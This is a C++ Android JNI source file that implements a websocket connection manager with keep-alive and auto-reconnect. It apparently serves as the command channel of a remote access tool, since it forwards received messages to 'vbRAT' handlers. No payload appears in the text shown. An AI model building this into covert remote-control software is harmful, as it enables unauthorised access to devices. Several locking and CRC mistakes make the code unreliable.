#include <jni.h>
#include <string>
#include <ctype.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <time.h>

#include "vbConnection.h"
#include "vbTTY.h"
#include "common.h"
#include "tiny_websockets/client.hpp"
#include "vbRAT.h"

//##################### PRIVATE #####################//
void* connectionMainThread();
void stateChange(vbConnection_state newState);
int errorSet(vbConnection_error err);
using namespace websockets;

typedef struct {
    bool init = false;
    char server_address[SERVER_ADDRESS_MAX_LEN];
    pthread_mutex_t stateLock;
    pthread_mutex_t socketLock;
    pthread_mutex_t errorLock;
    clock_t before;
    vbConnection_error lastError = NO_ERRORS;
    bool checkConn = false;
    pthread_t keepAliveT;
    pthread_t mainT;
    vbConnection_state state = S_TOINIZIALIZE;
    WebsocketsClient *socket;
    vbConnection_onEvent onConnectedCB = NULL;
    vbConnection_onEvent onDisconnectedCB = NULL;
    vbConnection_onReceived onMessageCB = NULL;
} vbConnection_private;

vbConnection_private vbConnection;

void vbConnection_onConnected(vbConnection_onEvent cb)
{
    if(cb) vbConnection.onConnectedCB=cb;
}
void vbConnection_onDisconnected(vbConnection_onEvent cb)
{
    if(cb) vbConnection.onDisconnectedCB=cb;
}
void vbConnection_onMessage(vbConnection_onReceived cb)
{
    if(cb) vbConnection.onMessageCB=cb;
}

int32_t vbConnection_Connect(const char *address)
{
    LOGW("vbConnection_Connect..");
    if (!vbConnection.init)
    {
        if (pthread_mutex_init(&vbConnection.socketLock, NULL) != 0
            || pthread_mutex_init(&vbConnection.stateLock, NULL) != 0
            || pthread_mutex_init(&vbConnection.errorLock, NULL) != 0)
        {
            vbConnection.state = S_ERROR;
            return 1;
        }
        else if (address == NULL || address == "" || strlen(address) > SERVER_ADDRESS_MAX_LEN)
        {
            errorSet(ERR_SERVER_ADDR_NOT_SET);
            return 1;
        }
        else
        {
            pthread_mutex_lock(&vbConnection.socketLock);
            {
                stateChange(S_INIT);
            }
            pthread_mutex_unlock(&vbConnection.socketLock);
            stateChange(S_INIT);
            snprintf(vbConnection.server_address, SERVER_ADDRESS_MAX_LEN, "%s", address);
            LOGW("new client..");
            vbConnection.socket = new WebsocketsClient();
            LOGW("starting thread..");
            pthread_create(&vbConnection.mainT, NULL, (void *(*)(void *)) connectionMainThread,
                           NULL);
            vbConnection.init = true;
            return 0;
        }
    }
    return 0;
}

vbConnection_error vbConnection_getError()
{
    vbConnection_error ret = ERR_MUTEX_ERROR;
    pthread_mutex_lock(&vbConnection.errorLock);
    {
        ret = vbConnection.lastError;
    }
    pthread_mutex_unlock(&vbConnection.errorLock);
    return vbConnection.lastError;
}

unsigned char getCRC(unsigned char *message, unsigned char length)
{
    unsigned char i, j, crc = 0;
    for (i = 0; i < length; i++)
    {
        crc ^= message[i];
        for (j = 0; j < 8; j++)
        {
            if (crc & 1)
                crc ^= 0x333;
            crc >>= 1;
        }
    }
    return crc;
}

int errorSet(vbConnection_error err)
{
    pthread_mutex_lock(&vbConnection.errorLock);
    {
        stateChange(S_ERROR);
        vbConnection.lastError=err;
    }
    pthread_mutex_unlock(&vbConnection.errorLock);
    return 0;
}

void keepAliveThread(WebsocketsClient *cli)
{

    while(true)
    {
        if(vbConnection_getState()==255)
            pthread_exit(0);
        pthread_mutex_lock(&vbConnection.socketLock);
        {
            if(vbConnection_getState()==S_CONNECTED) //yes we might have been locked for a while, so we need to double check about the state
            if (cli->available())
            {
                //vbConnection.socket->send("~p");//send something in order to keep the connection open

                vbConnection.socket->send("~c");//send something in order to keep the connection open
                vbConnection.checkConn = true;
                vbConnection.before = clock();
            }
        }
        pthread_mutex_unlock(&vbConnection.socketLock);
        sleep(12);
    }
}

void stateChange(vbConnection_state newState)
{
    pthread_mutex_lock(&vbConnection.stateLock);
    {
        vbConnection.state = newState;
    }
    pthread_mutex_unlock(&vbConnection.stateLock);
}

vbConnection_state vbConnection_getState()
{
    vbConnection_state ret;
    pthread_mutex_lock(&vbConnection.stateLock);
    {
        ret = vbConnection.state;
    }
    pthread_mutex_unlock(&vbConnection.stateLock);
    return ret;
}

void onMessageCallback(WebsocketsMessage message) //TODO decoupling for threadsafety
{
    if(strcmp(message.data().c_str(), "~c"))
        vbRAT_messageReceived(message.rawData().c_str(), message.length());
    else
    {
        vbConnection.checkConn = false;
    }
       // vbConnection.onMessageCB(message.rawData().c_str(), message.length());
    //ttySend(message.data().c_str());
}

void onEventsCallback(WebsocketsEvent event, std::string data) {
    if (event == WebsocketsEvent::ConnectionOpened)
    {

//        vbConnection.socket->send("~connected");
        pthread_create(&vbConnection.keepAliveT, NULL,
                       (void *(*)(void *)) keepAliveThread, vbConnection.socket);
        //vbConnection.onConnectedCB();
        vbRAT_connected();

    }
    else if (event == WebsocketsEvent::ConnectionClosed)
    {
        vbConnection.onDisconnectedCB();
    }
}
vbConnection_error vbConnection_Send(const char *msg)
{
    pthread_mutex_lock(&vbConnection.socketLock);
    vbConnection.socket->send(msg);
    pthread_mutex_unlock(&vbConnection.socketLock);
    return NO_ERRORS;
}


void* connectionMainThread() {
    int msec = 0, trigger = 10000; /* 10ms */
    while(true) {
        clock_t difference = clock() - vbConnection.before;
        msec = difference * 1000 / CLOCKS_PER_SEC;
        if((msec > trigger) && vbConnection.checkConn)
        {
            stateChange(S_DISCONNECTED);
            vbConnection.checkConn = false;
            LOGW("triggerfail..");
        }
        switch (vbConnection.state)
        {
            case S_INIT:
                vbConnection.socket->onMessage(onMessageCallback);
                vbConnection.socket->onEvent(onEventsCallback);
                LOGW("init connect..");
                if(vbConnection.socket->connect(vbConnection.server_address))
                    stateChange(S_CONNECTING);
                else
                    errorSet(ERR_CANNOT_CONNECT);
                break;
            case S_RECONNCTING:
            case S_CONNECTING:
                if (vbConnection.socket->available())
                {
                    LOGW("connected..");
                    stateChange(S_CONNECTED);
                }
                break;
            case S_CONNECTED:
                //pthread_mutex_lock(&vbConnection.socketLock);
                if (vbConnection.socket->available())
                    vbConnection.socket->poll();
                else
                    stateChange(S_DISCONNECTED);
                pthread_mutex_unlock(&vbConnection.socketLock);
                break;
            case S_DISCONNECTED:
                delete vbConnection.socket;
                LOGW("disconnected..");
                vbConnection.socket = new WebsocketsClient();
                //vbConnection.socket->connect(vbConnection.server_address);
                stateChange(S_INIT);
                break;
            case S_ERROR:
                //wstest.wsclient->shutdown(wstest.wsclient);
                LOGW("ERROR..");
                stateChange(S_DISCONNECTED);
                break;
            default:
                pthread_exit(0);
        }
    }
}
